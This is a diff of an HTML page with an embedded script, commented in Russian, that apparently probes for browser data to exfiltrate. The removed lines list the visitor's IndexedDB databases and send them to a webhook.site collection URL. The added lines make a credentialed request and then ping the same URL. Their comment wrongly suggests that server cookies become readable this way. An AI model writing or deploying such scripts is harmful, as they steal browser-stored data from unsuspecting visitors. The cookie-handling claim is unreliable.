@@ -1,9 +1,12 @@
 <!DOCTYPE html>
 <html>
 <script>
-// Пробуем прочитать IndexedDB
-indexedDB.databases().then(dbs => {
-  fetch('https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?indexeddb=' + encodeURIComponent(JSON.stringify(dbs)));
+// Просим сервер отправить куки
+fetch('/api/data', {
+  credentials: 'include'  // Отправляет куки с запросом
+}).then(r => {
+  // Серверные куки будут в заголовках ответа
+  fetch('https://webhook.site/a0a1812e-fd9e-41e8-8958-52aa40759367?server_cookies=check_headers');
 });
 </script>
 </html>
